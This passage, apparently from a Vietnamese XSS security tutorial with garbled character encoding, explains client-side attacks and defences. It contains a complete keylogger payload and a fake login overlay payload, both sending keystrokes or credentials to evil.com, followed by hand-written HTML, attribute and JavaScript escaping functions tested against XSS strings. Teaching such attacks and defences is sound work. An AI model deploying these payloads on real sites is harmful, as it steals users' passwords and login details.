  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ # (hash fragment) KHÃ”NG gá»­i lÃªn server!     â”‚  â”‚
  â”‚  â”‚  â†’ Server-side WAF KHÃ”NG THáº¤Y payload!          â”‚  â”‚
  â”‚  â”‚  â†’ Server-side filter HOÃ€N TOÃ€N VÃ” Dá»¤NG!       â”‚  â”‚
  â”‚  â”‚  â†’ Báº®T BUá»˜C pháº£i fix á»Ÿ CLIENT-SIDE!            â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§6. XSS Payload NÃ¢ng Cao â€” Keylogger & Phishing!

### 6.1. Tá»± Viáº¿t â€” XSS Keylogger!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// XSS KEYLOGGER â€” GHI Láº I Má»ŒI PHÃM GÃ•!
// CODE MINH Há»ŒA â€” KHÃ”NG DÃ™NG Äá»‚ Táº¤N CÃ”NG!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  KEYLOGGER CÆ  Báº¢N â€” PAYLOAD XSS:
function createKeyloggerPayload() {
  var payload =
    "<script>" +
    // Buffer ghi láº¡i cÃ¡c phÃ­m:
    "var _keys = [];" +
    // Láº¯ng nghe Má»ŒI phÃ­m gÃµ:
    'document.addEventListener("keypress", function(e) {' +
    "  _keys.push(e.key);" +
    // Má»—i 10 phÃ­m â†’ gá»­i vá» hacker server:
    "  if (_keys.length >= 10) {" +
    '    new Image().src = "https://evil.com/log?k=" + ' +
    '      encodeURIComponent(_keys.join(""));' +
    "    _keys = [];" + // Reset buffer!
    "  }" +
    "});" +
    "</script>";

  return payload;
}

// â‘¡ MÃ” PHá»NG KEYLOGGER HOáº T Äá»˜NG:
function simulateKeylogger() {
  var keyBuffer = [];
  var logsSent = [];

  // MÃ´ phá»ng user gÃµ password:
  var userTyping = "MyP@ssw0rd123";

  for (var i = 0; i < userTyping.length; i++) {
    keyBuffer.push(userTyping.charAt(i));

    // Má»—i 5 phÃ­m â†’ "gá»­i" vá» hacker:
    if (keyBuffer.length >= 5) {
      var chunk = keyBuffer.join("");
      logsSent.push({
        timestamp: Date.now(),
        keys: chunk,
        url: "https://evil.com/log?k=" + encodeURIComponent(chunk),
      });
      keyBuffer = []; // Reset!
    }
  }

  // Gá»­i pháº§n cÃ²n láº¡i:
  if (keyBuffer.length > 0) {
    logsSent.push({
      timestamp: Date.now(),
      keys: keyBuffer.join(""),
      url: "https://evil.com/log?k=" + encodeURIComponent(keyBuffer.join("")),
    });
  }

  console.log("âš  KEYLOGGER â€” Dá»® LIá»†U Bá»Š ÄÃNH Cáº®P:");
  for (var i = 0; i < logsSent.length; i++) {
    console.log("  Chunk " + (i + 1) + ":", logsSent[i].keys);
  }
  // Output:
  // âš  KEYLOGGER â€” Dá»® LIá»†U Bá»Š ÄÃNH Cáº®P:
  //   Chunk 1: MyP@s
  //   Chunk 2: sw0rd
  //   Chunk 3: 123
  //
  // â†’ Hacker ghÃ©p láº¡i: MyP@ssw0rd123 = Máº¬T KHáº¨U!
}

simulateKeylogger();
```

### 6.2. Tá»± Viáº¿t â€” XSS Phishing Form!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// XSS PHISHING â€” OVERLAY FORM GIáº¢ LÃŠN TRANG THáº¬T!
// CODE MINH Há»ŒA â€” KHÃ”NG DÃ™NG Äá»‚ Táº¤N CÃ”NG!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function createPhishingPayload() {
    // Payload táº¡o modal Ä‘Äƒng nháº­p GIáº¢:
    var payload = '<script>' +
        // â‘  Táº¡o overlay che toÃ n bá»™ trang:
        'var overlay = document.createElement("div");' +
        'overlay.style.cssText = "' +
            'position:fixed; top:0; left:0; width:100%; height:100%;' +
            'background:rgba(0,0,0,0.8); z-index:99999;' +
            'display:flex; align-items:center; justify-content:center;";' +

        // â‘¡ Táº¡o form Ä‘Äƒng nháº­p GIáº¢:
        'overlay.innerHTML = \'<div style="' +
            'background:white; padding:40px; border-radius:8px;' +
            'width:350px; font-family:Arial;">' +
            '<h2 style="margin:0 0 8px 0;">PhiÃªn Ä‘Äƒng nháº­p háº¿t háº¡n</h2>' +
            '<p style="color:#666; margin:0 0 20px 0;">' +
                'Vui lÃ²ng Ä‘Äƒng nháº­p láº¡i Ä‘á»ƒ tiáº¿p tá»¥c.</p>' +
            '<input id="fake-user" type="text" placeholder="Email"' +
                ' style="width:100%; padding:10px; margin:5px 0;' +
                ' border:1px solid #ddd; border-radius:4px;">' +
            '<input id="fake-pass" type="password" placeholder="Máº­t kháº©u"' +
                ' style="width:100%; padding:10px; margin:5px 0;' +
                ' border:1px solid #ddd; border-radius:4px;">' +
            '<button onclick="' +
                'var u=document.getElementById(\\'fake-user\\').value;' +
                'var p=document.getElementById(\\'fake-pass\\').value;' +
                'new Image().src=\\'https://evil.com/phish?u=\\'' +
                    '+encodeURIComponent(u)+\\'&p=\\'+encodeURIComponent(p);' +
                'this.parentElement.parentElement.remove();' +
            '" style="width:100%; padding:10px; margin-top:10px;' +
                ' background:#1877f2; color:white; border:none;' +
                ' border-radius:4px; cursor:pointer; font-size:16px;">' +
                'ÄÄƒng nháº­p</button>' +
        '</div>\';' +

        // â‘¢ ThÃªm vÃ o trang:
        'document.body.appendChild(overlay);' +
        '</script>';

    return payload;
}

// â†’ User tháº¥y modal "PhiÃªn háº¿t háº¡n"!
// â†’ URL váº«n lÃ  bank.com â†’ TIN TÆ¯á»NG!
// â†’ NHáº¬P email + password â†’ gá»­i cho hacker!
// â†’ Modal biáº¿n máº¥t â†’ user khÃ´ng nghi ngá»!
```

```
  PHISHING XSS â€” SÆ  Äá»’:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  TRANG Gá»C (bank.com):                                â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚  â”‚
  â”‚  â”‚  â”‚       bank.com Dashboard             â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚                                      â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚ âš  OVERLAY GIáº¢ (XSS!)      â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚                             â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚  PhiÃªn Ä‘Äƒng nháº­p háº¿t háº¡n   â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚                             â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚  Email: [__________]       â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚  Pass:  [__________]       â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚                             â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚  [  ÄÄƒng nháº­p  ]           â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â”‚     â†‘ CLICK = gá»­i evil.com!â”‚    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚                                      â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  URL bar: https://bank.com â† THáº¬T! â”‚        â”‚  â”‚
  â”‚  â”‚  â”‚  â†’ User tin tÆ°á»Ÿng 100%!             â”‚        â”‚  â”‚
  â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â†’ User nháº­p tháº­t â†’ evil.com nháº­n credentials!        â”‚
  â”‚  â†’ Modal biáº¿n máº¥t â†’ user nghÄ© "Ä‘Ã£ Ä‘Äƒng nháº­p láº¡i"!    â”‚
  â”‚  â†’ KHÃ”NG NGHI NGá»œ vÃ¬ URL lÃ  bank.com!                 â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§7. Tá»± Viáº¿t â€” HTML Escape (PhÃ²ng Thá»§ ChÃ­nh!)

### 7.1. NguyÃªn LÃ½ â€” Escape Output!

```
  NGUYÃŠN LÃ PHÃ’NG THá»¦ XSS â€” ESCAPE OUTPUT!
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  NGUYÃŠN Táº®C Sá» 1:                                     â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âŒ Lá»ŒC INPUT (blacklist) â†’ THáº¤T Báº I!          â”‚  â”‚
  â”‚  â”‚     â†’ QuÃ¡ nhiá»u cÃ¡ch bypass!                    â”‚  â”‚
  â”‚  â”‚     â†’ KhÃ´ng bao giá» liá»‡t kÃª háº¿t!                â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âœ… ESCAPE OUTPUT â†’ ÄÃšNG CÃCH!                  â”‚  â”‚
  â”‚  â”‚     â†’ Biáº¿n kÃ½ tá»± Ä‘áº·c biá»‡t thÃ nh text!          â”‚  â”‚
  â”‚  â”‚     â†’ < thÃ nh &lt;                              â”‚  â”‚
  â”‚  â”‚     â†’ > thÃ nh &gt;                              â”‚  â”‚
  â”‚  â”‚     â†’ Browser HIá»‚N THá»Š "<" thay vÃ¬ parse HTML!  â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  5 KÃ Tá»° Cáº¦N ESCAPE:                                  â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  KÃ½ tá»±    â”‚ HTML Entity â”‚ Táº¡i sao escape?       â”‚  â”‚
  â”‚  â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  â”‚
  â”‚  â”‚  <        â”‚ &lt;        â”‚ Má»Ÿ HTML tag!          â”‚  â”‚
  â”‚  â”‚  >        â”‚ &gt;        â”‚ ÄÃ³ng HTML tag!        â”‚  â”‚
  â”‚  â”‚  &        â”‚ &amp;       â”‚ Báº¯t Ä‘áº§u HTML entity!  â”‚  â”‚
  â”‚  â”‚  "        â”‚ &quot;      â”‚ ÄÃ³ng/má»Ÿ attribute!    â”‚  â”‚
  â”‚  â”‚  '        â”‚ &#39;       â”‚ ÄÃ³ng/má»Ÿ attribute!    â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 7.2. Tá»± Viáº¿t â€” HTML Escape Tá»« Äáº§u!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// HTML ESCAPE â€” Tá»° VIáº¾T Tá»ª Äáº¦U!
// Biáº¿n kÃ½ tá»± nguy hiá»ƒm thÃ nh HTML entities!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  HTML ESCAPE CÆ  Báº¢N:
function escapeHTML(str) {
  if (typeof str !== "string") {
    return String(str);
  }

  var result = "";
  for (var i = 0; i < str.length; i++) {
    var char = str.charAt(i);

    switch (char) {
      case "<":
        result += "&lt;";
        break;
      case ">":
        result += "&gt;";
        break;
      case "&":
        result += "&amp;";
        break;
      case '"':
        result += "&quot;";
        break;
      case "'":
        result += "&#39;";
        break;
      default:
        result += char;
    }
  }
  return result;
}

// â‘¡ THá»¬ NGHIá»†M:
var malicious = '<script>alert("XSS")</script>';
var safe = escapeHTML(malicious);
console.log("TrÆ°á»›c:", malicious);
console.log("Sau:  ", safe);
// TrÆ°á»›c: <script>alert("XSS")</script>
// Sau:   &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
//
// â†’ Browser HIá»‚N THá»Š: <script>alert("XSS")</script>
// â†’ KHÃ”NG CHáº Y JavaScript!
// â†’ User tháº¥y text, KHÃ”NG pháº£i code!

// â‘¢ ÃP Dá»¤NG VÃ€O SERVER:
function renderCommentsSafe(comments) {
  var html = '<div class="comments">';

  for (var i = 0; i < comments.length; i++) {
    var comment = comments[i];

    // âœ… ESCAPE trÆ°á»›c khi chÃ¨n vÃ o HTML!
    html += '<div class="comment">';
    html += "  <h4>" + escapeHTML(comment.username) + "</h4>";
    html += "  <p>" + escapeHTML(comment.content) + "</p>";
    html += "</div>";
  }

  html += "</div>";
  return html;
}

// â‘£ THá»¬ Vá»šI PAYLOAD XSS:
var safeHtml = renderCommentsSafe([
  {
    username: "Hacker<script>alert(1)</script>",
    content: "<img src=x onerror=alert(document.cookie)>",
  },
]);
console.log(safeHtml);
// â†’ <h4>&lt;Hacker&lt;script&gt;alert(1)&lt;/script&gt;</h4>
// â†’ <p>&lt;img src=x onerror=alert(document.cookie)&gt;</p>
// â†’ AN TOÃ€N! Script KHÃ”NG cháº¡y!
```

### 7.3. Tá»± Viáº¿t â€” Escape Cho Attribute!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ATTRIBUTE ESCAPE â€” PHá»¨C Táº P HÆ N HTML ESCAPE!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  Táº I SAO Cáº¦N ATTRIBUTE ESCAPE RIÃŠNG?
// HTML Escape chá»‰ xá»­ lÃ½ ná»™i dung HTML (text nodes)
// Attribute cáº§n escape THÃŠM cÃ¡c kÃ½ tá»± khÃ¡c!

// VÃ Dá»¤ â€” Táº¥n cÃ´ng attribute:
// <input value="USER_INPUT">
// User input: " onfocus="alert(1)" autofocus="
// Káº¿t quáº£: <input value="" onfocus="alert(1)" autofocus="">
// â†’ THOÃT KHá»I attribute! ThÃªm event handler!

// â‘¡ ATTRIBUTE ESCAPE â€” Tá»° VIáº¾T:
function escapeAttribute(str) {
  if (typeof str !== "string") {
    return String(str);
  }

  var result = "";
  for (var i = 0; i < str.length; i++) {
    var char = str.charAt(i);
    var code = str.charCodeAt(i);

    switch (char) {
      case "&":
        result += "&amp;";
        break;
      case "<":
        result += "&lt;";
        break;
      case ">":
        result += "&gt;";
        break;
      case '"':
        result += "&quot;";
        break;
      case "'":
        result += "&#39;";
        break;
      case "/":
        result += "&#x2F;";
        break;
      case "`":
        result += "&#96;";
        break;
      default:
        // Encode kÃ½ tá»± khÃ´ng pháº£i alphanumeric:
        if (code < 256) {
          result += char;
        } else {
          result += "&#x" + code.toString(16) + ";";
        }
    }
  }
  return result;
}

// â‘¢ JAVASCRIPT ESCAPE â€” CHO EVENT HANDLERS:
function escapeJavaScript(str) {
  if (typeof str !== "string") {
    return String(str);
  }

  var result = "";
  for (var i = 0; i < str.length; i++) {
    var code = str.charCodeAt(i);

    // CHá»ˆ cho phÃ©p alphanumeric:
    if (
      (code >= 48 && code <= 57) || // 0-9
      (code >= 65 && code <= 90) || // A-Z
      (code >= 97 && code <= 122)
    ) {
      // a-z
      result += str.charAt(i);
    } else {
      // Escape táº¥t cáº£ kÃ½ tá»± khÃ¡c:
      var hex = code.toString(16);
      if (code < 256) {
        result += "\\x" + ("00" + hex).slice(-2);
      } else {
        result += "\\u" + ("0000" + hex).slice(-4);
      }
    }
  }
  return result;
}

// â‘£ THá»¬ NGHIá»†M:
var attackInput = '" onfocus="alert(1)" autofocus="';
console.log("HTML Escape:", escapeAttribute(attackInput));
// â†’ &quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;
// â†’ AN TOÃ€N! Attribute KHÃ”NG bá»‹ thoÃ¡t!

var jsAttack = "';alert('XSS');//";
console.log("JS Escape:", escapeJavaScript(jsAttack));
// â†’ \x27\x3balert\x28\x27XSS\x27\x29\x3b\x2f\x2f
// â†’ AN TOÃ€N! JavaScript KHÃ”NG cháº¡y!
```

```
  ESCAPE â€” á» ÄÃ‚U DÃ™NG LOáº I NÃ€O?
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  NGá»® Cáº¢NH â†’ LOáº I ESCAPE:                              â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘  HTML Body:                                    â”‚  â”‚
  â”‚  â”‚     <p>USER_INPUT</p>                            â”‚  â”‚
  â”‚  â”‚     â†’ dÃ¹ng escapeHTML()                         â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘¡ HTML Attribute:                               â”‚  â”‚
  â”‚  â”‚     <input value="USER_INPUT">                   â”‚  â”‚
  â”‚  â”‚     â†’ dÃ¹ng escapeAttribute()                    â”‚  â”‚
  â”‚  â”‚     â†’ LUÃ”N dÃ¹ng dáº¥u ngoáº·c kÃ©p "..."!           â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘¢ JavaScript String:                             â”‚  â”‚
  â”‚  â”‚     <script>var x = 'USER_INPUT';</script>       â”‚  â”‚
  â”‚  â”‚     â†’ dÃ¹ng escapeJavaScript()                   â”‚  â”‚
  â”‚  â”‚     â†’ Tá»T HÆ N: KHÃ”NG chÃ¨n user input vÃ o JS!  â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘£ URL Parameter:                                 â”‚  â”‚
  â”‚  â”‚     <a href="/page?q=USER_INPUT">                â”‚  â”‚
  â”‚  â”‚     â†’ dÃ¹ng encodeURIComponent()                 â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â‘¤ CSS Value:                                     â”‚  â”‚
  â”‚  â”‚     <div style="color: USER_INPUT">              â”‚  â”‚
  â”‚  â”‚     â†’ TRÃNH! DÃ¹ng class thay inline style!      â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  âš  NGUYÃŠN Táº®C VÃ€NG:                                   â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â†’ Escape PHÃ™ Há»¢P vá»›i ngá»¯ cáº£nh!                â”‚  â”‚
  â”‚  â”‚  â†’ HTML escape trong JS = KHÃ”NG Äá»¦!            â”‚  â”‚
  â”‚  â”‚  â†’ JS escape trong HTML = KHÃ”NG Äá»¦!            â”‚  â”‚
  â”‚  â”‚  â†’ Sai ngá»¯ cáº£nh = VáºªN Bá»Š XSS!                 â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§8. Tá»± Viáº¿t â€” HTML Sanitizer Tá»« Äáº§u!

### 8.1. Sanitizer LÃ  GÃ¬?

```
  SANITIZER vs ESCAPE â€” KHÃC GÃŒ NHAU?
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  ESCAPE:                                                â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Input: <b>Hello</b> <script>alert(1)</script>  â”‚  â”‚
  â”‚  â”‚  Output: &lt;b&gt;Hello&lt;/b&gt; &lt;script...  â”‚  â”‚
  â”‚  â”‚  â†’ KHÃ”NG CÃ“ HTML nÃ o Ä‘Æ°á»£c giá»¯ láº¡i!             â”‚  â”‚
  â”‚  â”‚  â†’ Má»i thá»© thÃ nh TEXT!                          â”‚  â”‚
  â”‚  â”‚  â†’ DÃ¹ng khi: KHÃ”NG Cáº¦N HTML (tÃªn, email...)    â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  SANITIZE:                                              â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Input: <b>Hello</b> <script>alert(1)</script>  â”‚  â”‚
  â”‚  â”‚  Output: <b>Hello</b>                            â”‚  â”‚
  â”‚  â”‚  â†’ GIá»® Láº I HTML an toÃ n (<b>, <i>, <a>...)    â”‚  â”‚
  â”‚  â”‚  â†’ XÃ“A HTML nguy hiá»ƒm (<script>, onerror...)   â”‚  â”‚
  â”‚  â”‚  â†’ DÃ¹ng khi: Cáº¦N HTML (rich text, blog...)     â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  KHI NÃ€O DÃ™NG CÃI NÃ€O?                                â”‚
